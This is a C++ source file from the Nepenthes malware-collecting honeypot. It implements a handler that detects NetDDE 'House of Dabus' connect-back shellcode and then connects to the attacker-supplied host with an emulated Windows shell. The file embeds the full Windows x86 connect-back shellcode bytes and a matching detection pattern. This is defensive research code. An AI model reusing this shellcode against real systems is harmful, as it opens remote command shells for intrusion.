/********************************************************************************
 *                              Nepenthes
 *                        - finest collection -
 *
 *
 *
 * Copyright (C) 2005  Paul Baecher & Markus Koetter
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 * 
 * 
 *             contact nepenthesdev@users.sourceforge.net  
 *
 *******************************************************************************/

 /* $Id: sch_netdde_hod_connect.cpp 1927 2005-08-27 21:56:59Z dp $ */

#include <netinet/in.h>
#include <arpa/inet.h>

#include "LogManager.hpp"
#include "Message.hpp"
#include "sch_netdde_hod_connect.hpp"
#include "Socket.hpp"
#include "Nepenthes.hpp"
#include "Utilities.hpp"
#include "DialogueFactoryManager.hpp"
#include "SocketManager.hpp"

#include "DialogueFactory.hpp"

#ifdef STDTAGS 
#undef STDTAGS 
#endif
#define STDTAGS l_sc | l_hlr

using namespace nepenthes;

HODConnect::HODConnect(ShellcodeManager *shellcodemanager)
{
	m_ShellcodeManager = shellcodemanager;
	m_ShellcodeHandlerName = "HODConnect";
	m_ShellcodeHandlerDescription = "handles house of dabus netdde bindshells";
	m_pcre = NULL;
}

HODConnect::~HODConnect()
{

}
unsigned char connectbacksc[] = 
"\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c" 
"\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b" 
"\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78" 
"\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b" 
"\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03" 
"\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b" 
"\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c" 
"\x61\xc3\xeb\x35\xad\x50\x52\xe8\xa8\xff\xff\xff\x89\x07\x83\xc4" 
"\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xec\x72\xfe\xb3" 
"\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xec\xf9\xaa" 
"\x60\xcb\xed\xfc\x3b\xe7\x79\xc6\x79\x83\xec\x60\x8b\xec\xeb\x02" 
"\xeb\x05\xe8\xf9\xff\xff\xff\x5e\xe8\x45\xff\xff\xff\x8b\xd0\x83" 
"\xee\x2e\x8d\x7d\x04\x8b\xce\x83\xc1\x10\xe8\xa5\xff\xff\xff\x83" 
"\xc1\x10\x33\xc0\x66\xb8\x33\x32\x50\x68\x77\x73\x32\x5f\x8b\xdc" 
"\x51\x52\x53\xff\x55\x04\x5a\x59\x8b\xd0\xe8\x85\xff\xff\xff\xb8" 
"\x01\x63\x6d\x64\xc1\xf8\x08\x50\x89\x65\x30\x33\xc0\x66\xb8\x90" 
"\x01\x2b\xe0\x54\x83\xc0\x72\x50\xff\x55\x1c\x33\xc0\x50\x50\x50" 
"\x50\x40\x50\x40\x50\xff\x55\x14\x8b\xf0\x68\x7f\x01\x01\x01\xb8" 
"\x02\x01\x11\x5c\xfe\xcc\x50\x8b\xdc\x33\xc0\xb0\x10\x50\x53\x56" 
"\xff\x55\x18\x33\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa" 
"\x5f\xc6\x07\x44\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab" 
"\x5f\x33\xc0\x8d\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50" 
"\xff\x75\x30\x50\xff\x55\x08\xf7\xd0\x50\xff\x36\xff\x55\x10\xff" 
"\x77\x38\xff\x55\x20\xff\x55\x0c"; 

bool HODConnect::Init()
{
	logPF();

	const char *thcconnectpcre = //".*(\\xeb\\x70\\x56\\x33\\xc0\\x64\\x8b\\x40\\x30\\x85\\xc0\\x78\\x0c\\x8b\\x40\\x0c.*\\x77\\x38\\xff\\x55\\x20\\xff\\x55\\x0c).*";
	"\\xEB\\x70\\x56\\x33\\xC0\\x64\\x8B\\x40\\x30\\x85\\xC0\\x78\\x0C\\x8B\\x40\\x0C"
	"\\x8B\\x70\\x1C\\xAD\\x8B\\x40\\x08\\xEB\\x09\\x8B\\x40\\x34\\x8D\\x40\\x7C\\x8B"
	"\\x40\\x3C\\x5E\\xC3\\x60\\x8B\\x6C\\x24\\x24\\x8B\\x45\\x3C\\x8B\\x54\\x05\\x78"
	"\\x03\\xD5\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDD\\xE3\\x34\\x49\\x8B\\x34\\x8B"
	"\\x03\\xF5\\x33\\xFF\\x33\\xC0\\xFC\\xAC\\x84\\xC0\\x74\\x07\\xC1\\xCF\\x0D\\x03"
	"\\xF8\\xEB\\xF4\\x3B\\x7C\\x24\\x28\\x75\\xE1\\x8B\\x5A\\x24\\x03\\xDD\\x66\\x8B"
	"\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDD\\x8B\\x04\\x8B\\x03\\xC5\\x89\\x44\\x24\\x1C"
	"\\x61\\xC3\\xEB\\x35\\xAD\\x50\\x52\\xE8\\xA8\\xFF\\xFF\\xFF\\x89\\x07\\x83\\xC4"
	"\\x08\\x83\\xC7\\x04\\x3B\\xF1\\x75\\xEC\\xC3\\x8E\\x4E\\x0E\\xEC\\x72\\xFE\\xB3"
	"\\x16\\x7E\\xD8\\xE2\\x73\\xAD\\xD9\\x05\\xCE\\xD9\\x09\\xF5\\xAD\\xEC\\xF9\\xAA"
	"\\x60\\xCB\\xED\\xFC\\x3B\\xE7\\x79\\xC6\\x79\\x83\\xEC\\x60\\x8B\\xEC\\xEB\\x02"
	"\\xEB\\x05\\xE8\\xF9\\xFF\\xFF\\xFF\\x5E\\xE8\\x45\\xFF\\xFF\\xFF\\x8B\\xD0\\x83"
	"\\xEE\\x2E\\x8D\\x7D\\x04\\x8B\\xCE\\x83\\xC1\\x10\\xE8\\xA5\\xFF\\xFF\\xFF\\x83"
	"\\xC1\\x10\\x33\\xC0\\x66\\xB8\\x33\\x32\\x50\\x68\\x77\\x73\\x32\\x5F\\x8B\\xDC"
	"\\x51\\x52\\x53\\xFF\\x55\\x04\\x5A\\x59\\x8B\\xD0\\xE8\\x85\\xFF\\xFF\\xFF\\xB8"
	"\\x01\\x63\\x6D\\x64\\xC1\\xF8\\x08\\x50\\x89\\x65\\x30\\x33\\xC0\\x66\\xB8\\x90"
	"\\x01\\x2B\\xE0\\x54\\x83\\xC0\\x72\\x50\\xFF\\x55\\x1C\\x33\\xC0\\x50\\x50\\x50"
	"\\x50\\x40\\x50\\x40\\x50\\xFF\\x55\\x14\\x8B\\xF0\\x68(....)\\xB8"
	"\\x02\\x01(..)\\xFE\\xCC\\x50\\x8B\\xDC\\x33\\xC0\\xB0\\x10\\x50\\x53\\x56"
	"\\xFF\\x55\\x18\\x33\\xC9\\xB1\\x54\\x2B\\xE1\\x8B\\xFC\\x57\\x33\\xC0\\xF3\\xAA"
	"\\x5F\\xC6\\x07\\x44\\xFE\\x47\\x2D\\x57\\x8B\\xC6\\x8D\\x7F\\x38\\xAB\\xAB\\xAB"
	"\\x5F\\x33\\xC0\\x8D\\x77\\x44\\x56\\x57\\x50\\x50\\x50\\x40\\x50\\x48\\x50\\x50"
	"\\xFF\\x75\\x30\\x50\\xFF\\x55\\x08\\xF7\\xD0\\x50\\xFF\\x36\\xFF\\x55\\x10\\xFF"
	"\\x77\\x38\\xFF\\x55\\x20\\xFF\\x55";
	logInfo("pcre is %s \n",thcconnectpcre);
    
	const char * pcreEerror;
	int32_t pcreErrorPos;
	if((m_pcre = pcre_compile(thcconnectpcre, PCRE_DOTALL, &pcreEerror, &pcreErrorPos, 0)) == NULL)
	{
		logCrit("HODConnect could not compile pattern \n\t\"%s\"\n\t Error:\"%s\" at Position %u", 
				thcconnectpcre, pcreEerror, pcreErrorPos);
		return false;
	}
	return true;
}

bool HODConnect::Exit()
{
	if(m_pcre != NULL)
    	free(m_pcre);
	return true;

}



sch_result HODConnect::handleShellcode(Message **msg)
{
	logPF();
	logSpam("Shellcode is %i bytes long \n",(*msg)->getMsgLen());
	char *shellcode = (*msg)->getMsg();
	uint32_t len = (*msg)->getMsgLen();

	int32_t piOutput[10 * 3];
	int32_t iResult; 

	if ((iResult = pcre_exec(m_pcre, 0, (char *) shellcode, len, 0, 0, piOutput, sizeof(piOutput)/sizeof(int32_t))) > 0)
	{
		const char * match;
		uint16_t port;
		uint32_t host;

		pcre_get_substring((char *) shellcode, piOutput, iResult, 1, &match);
		host = * ((uint32_t *) match);
		pcre_free_substring(match);

		pcre_get_substring((char *) shellcode, piOutput, iResult, 2, &match);
		port = *(uint16_t *) match;
		port = ntohs(port);
		pcre_free_substring(match);

		logInfo("Detected NetDDE HoD connectback shellcode, %s:%u  \n", inet_ntoa(*(in_addr *)&host), port);


		Socket *sock = g_Nepenthes->getSocketMgr()->connectTCPHost(0,host,port,30);
		DialogueFactory *diaf;
		if ((diaf = g_Nepenthes->getFactoryMgr()->getFactory("WinNTShell DialogueFactory")) == NULL)
		{
			logCrit("%s","No WinNTShell DialogueFactory availible \n");
			return SCH_DONE;
		}
		sock->addDialogue(diaf->createDialogue(sock));
		return SCH_DONE;

	}
	return SCH_NOTHING;
}

